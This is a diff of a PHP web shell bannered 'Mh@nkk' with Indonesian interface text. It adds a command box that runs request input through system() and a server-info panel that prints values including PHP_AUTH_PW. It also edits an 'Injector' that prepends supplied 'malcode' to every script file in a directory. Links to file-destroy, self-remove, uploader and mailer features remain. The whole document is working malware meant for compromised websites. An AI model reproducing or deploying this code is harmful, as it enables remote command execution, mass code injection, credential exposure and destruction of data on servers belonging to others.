@@ -24,7 +24,10 @@ session_regenerate_id(true);
 "; ?><br>
 #[dir]: <?php echo getcwd(); ?>\<?php $current_file_name = basename($_SERVER['PHP_SELF']);
 echo $current_file_name . "
-"; ?><br><br>+------------------------+[ Mh@nkk ]+------------------------+</div><br>
+"; ?><br>
+#[Dis Funct]:<?php echo ini_get('disable_functions'); ?><br>
+#[Free Storage]:<?php $bytes = disk_free_space(".");$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');$base = 1024;$class = min((int)log($bytes , $base) , count($si_prefix) - 1);echo sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '<br />';?>
+<br>+------------------------+[ Mh@nkk ]+------------------------+</div><br>
 <img src="https://1.bp.blogspot.com/-ha3hqk1FS9w/XYRtZPyyofI/AAAAAAAAASo/ynpaUw_nNFERbwZGVWXXA4zFJm91gjGUQCLcBGAsYHQ/s320/Shinobu%2BKoucho2.png"style="width: 230px; left:0px;top:2px;position:absolute;" />
 <img src="https://1.bp.blogspot.com/-7mkmbatW1RM/XYRtZLvuVeI/AAAAAAAAASs/ZlxAXKP5oWAvNxY-bxXaL1fTVJxxBGADACLcBGAsYHQ/s320/Shinobu%2BKoucho.png" style="width: 200px; left:1040px;top:16px;position:absolute;">
 <!--End Header-->
@@ -34,6 +37,8 @@ echo $current_file_name . "
     <a href="?uploader" class="cus">Uploader</a>
     <a href="?injector" class="cus">Injector</a>
     <a href="?mailer" class="cus">Mailer</a>
+    <a href="?cmd" class="cus">CMD</a>
+    <a href="?srvinf" class="cus">Server Info</a>
     <a href="?phpinfo" class="cus">PHP Info</a>
     <a href="?delete" class="cus" onclick="return  confirm('Hapus semua files?')">File Destroy</a>
     <a href="?die" class="cus" onclick="return  confirm('Mau Pergi?')">Self Remove</a>
@@ -66,46 +71,46 @@ if(isset($_POST['upload'])) {
 <?php if(isset($_GET['injector'])){echo '<br><center><br><font>Injector Code</font><br><br><form action="" method="POST"><textarea type="text" name="code" rows="13" cols="80" placeholder="Injector Code"></textarea><br><br><input type="submit" name="submit" value="Submit" /></form></div>';} ?>
             <?php 
             if (isset($_POST['submit'])) {
-                $gwk = $_POST['code'];$blv = base64_encode($gwk);
+                $gf = $_POST['code'];$blv = base64_encode($gf);
                 $cwd = getcwd();$tol = 'http://'.$_SERVER['HTTP_HOST'];
-                $crotz = $_SERVER['DOCUMENT_ROOT'];
-                $kon = $tol.$crotz;
+                $cr = $_SERVER['DOCUMENT_ROOT'];
+                $kon = $tol.$cr;
                 $cwd = getcwd();
                 $ntpz = $cwd;
-                if (empty($gwk)) {
+                if (empty($gf)) {
                     echo '<font color=\'red\'>Masukan Malcode mu!!! :P</font>';}
-                    if (!empty($gwk)) {
+                    if (!empty($gf)) {
                         if ($pasi = opendir($ntpz)) {
                             echo 'Website: '.$kon.'<br><br>';echo 'Looking in '.$ntpz.'';
-                            while ($ken2 = readdir($pasi)) {
-                                if ($ken2 != '.' && $ken2 != '..' && $ken2 != 'rev.php' && $ken2 != 'REV.php' && $ken2 != '.htaccess' && $ken2 != 'php.ini' && $ken2 != 'admin' && $ken2 != 'images' && $ken2 != 'image' && $ken2 != 'img' && $ken2 != 'phpmyadmin' && $ken2 != 'files' && $ken2 != '.ftpquota' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'xml' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpg' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'png' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpeg' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'txt' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'exe' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'html' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'shtml' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'htm' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'css' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'zip' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'js' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'py' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'pl' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'md' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'gif' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'tar.gz' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'c' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql.zip' && 
-                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'out') {
-                                    echo '<center><a target="_blank" href="'.$ken2.'">'.$ken2.'</a><font>&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
+                            while ($b = readdir($pasi)) {
+                                if ($b != '.' && $b != '..' && $b != 'rev.php' && $b != 'REV.php' && $b != '.htaccess' && $b != 'php.ini' && $b != 'admin' && $b != 'images' && $b != 'image' && $b != 'img' && $b != 'phpmyadmin' && $b != 'files' && $b != '.ftpquota' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'xml' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'jpg' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'ico' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'png' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'jpeg' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'txt' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'exe' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'html' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'shtml' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'htm' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'ico' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'css' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'zip' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'sql' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'js' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'py' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'pl' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'md' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'gif' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'tar.gz' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'c' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'sql.zip' && 
+                                strtolower(substr($b, strrpos($b, '.') + 1)) != 'out') {
+                                    echo '<center><a target="_blank" href="'.$b.'">'.$b.'</a><font>&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
                             $jmb = base64_decode($blv);
-                            $jmb .= file_get_contents($ken2);
-                        file_put_contents($ken2, $jmb); 
+                            $jmb .= file_get_contents($b);
+                        file_put_contents($b, $jmb); 
                     echo '</center>';} }}}}?><br><br>
 <!--//End Injector-->
 
@@ -123,6 +128,15 @@ echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><
     mail($to,$subject,$message, $headers);    
     echo "Pesan email sudah terkirim ke ".$to."";}?>
 <!--//End Mailer-->
+
+<!--//Command-->
+<?php
+if(isset($_GET['cmd'])){
+    echo "<font>Command Line</font><br><br><form><input type='text' name='cmd' /><input type='submit'value='Exec' /></form>";
+        echo "<br><pre>";
+        echo @system($_GET['cmd']);
+        echo "</font></pre>";}
+?>
 
 <!--//File Destroy-->
 <?php 
@@ -144,12 +158,70 @@ if (isset($_GET['die'])) {
 ?>
 <!--//End Self Remove-->
 
+<!--//Server Info-->
+<?php
+if (isset($_GET['srvinf'])) {
+
+$srvf = array('PHP_SELF',
+'argv',
+'argc',
+'GATEWAY_INTERFACE',
+'SERVER_ADDR',
+'SERVER_NAME',
+'SERVER_SOFTWARE',
+'SERVER_PROTOCOL',
+'REQUEST_METHOD',
+'REQUEST_TIME',
+'REQUEST_TIME_FLOAT',
+'QUERY_STRING',
+'DOCUMENT_ROOT',
+'HTTP_ACCEPT',
+'HTTP_ACCEPT_CHARSET',
+'HTTP_ACCEPT_ENCODING',
+'HTTP_ACCEPT_LANGUAGE',
+'HTTP_CONNECTION',
+'HTTP_HOST',
+'HTTP_REFERER',
+'HTTP_USER_AGENT',
+'HTTPS',
+'REMOTE_ADDR',
+'REMOTE_HOST',
+'REMOTE_PORT',
+'REMOTE_USER',
+'REDIRECT_REMOTE_USER',
+'SCRIPT_FILENAME',
+'SERVER_ADMIN',
+'SERVER_PORT',
+'SERVER_SIGNATURE',
+'PATH_TRANSLATED',
+'SCRIPT_NAME',
+'REQUEST_URI',
+'PHP_AUTH_DIGEST',
+'PHP_AUTH_USER',
+'PHP_AUTH_PW',
+'AUTH_TYPE',
+'PATH_INFO',
+'ORIG_PATH_INFO') ;
+
+echo '<center><table border="2" cellpadding="10" color="white">' ;
+foreach ($srvf as $arg) {
+    if (isset($_SERVER[$arg])) {
+        echo '<tr><td><font color="white">'.$arg.'</td><td><font color="white">' . $_SERVER[$arg] . '</td></tr>' ;
+    }
+    else {
+        echo '<font color="white"><tr><td>'.$arg.'</td><td>-</td></tr>' ;
+    }
+}
+echo '</table></center>' ;}
+?>
+<!--//End Server Info-->
+
 <!--//File Manager-->
 <?php
     if (isset($_GET['file_manager'])) {
         echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';$cwd = getcwd();
     $cwd = str_replace('\\','/',$cwd);$entah = explode('/',$cwd);
-function permsa($kntl){$mw = fileperms($kntl);
+function permsa($bl){$mw = fileperms($bl);
     if (($mw & 0xC000) == 0xC000) {$hnk = 's';} 
     elseif (($mw & 0xA000) == 0xA000) {$hnk = 'l';} 
     elseif (($mw & 0x8000) == 0x8000) {$hnk = '-';} 
@@ -214,15 +286,15 @@ function permsa($kntl){$mw = fileperms($kntl);
                     if(is_writable("$cwd/$kawai") || !is_readable("$cwd/$kawai")) echo '</font>'; 
                     echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$kawai\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kawai\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } 
                     echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
-            foreach($yonchan as $kntl){ 
-                if(!is_file("$cwd/$kntl")) continue; 
-                $ngtdd = filesize("$cwd/$kntl")/1024; 
+            foreach($yonchan as $bl){ 
+                if(!is_file("$cwd/$bl")) continue; 
+                $ngtdd = filesize("$cwd/$bl")/1024; 
                 $ngtdd = round($ngtdd,3); 
                 if($ngtdd >= 1024){ $ngtdd = round($ngtdd/1024,2).' MB'; }else{ $ngtdd = $ngtdd.' KB'; } 
-                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$kntl&path=$cwd\">$kntl</a></td><td><center>".$ngtdd."</center></td><td><center>"; 
-                if(is_writable("$cwd/$kntl")) echo '<font color="green">';
-            elseif(!is_readable("$cwd/$kntl")) echo '<font color="red">'; 
-                echo permsa("$cwd/$kntl"); 
-            if(is_writable("$cwd/$kntl") || !is_readable("$cwd/$kntl")) echo '</font>'; 
-    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$kntl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kntl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
+                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$bl&path=$cwd\">$bl</a></td><td><center>".$ngtdd."</center></td><td><center>"; 
+                if(is_writable("$cwd/$bl")) echo '<font color="green">';
+            elseif(!is_readable("$cwd/$bl")) echo '<font color="red">'; 
+                echo permsa("$cwd/$bl"); 
+            if(is_writable("$cwd/$bl") || !is_readable("$cwd/$bl")) echo '</font>'; 
+    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$bl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$bl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
 </div>
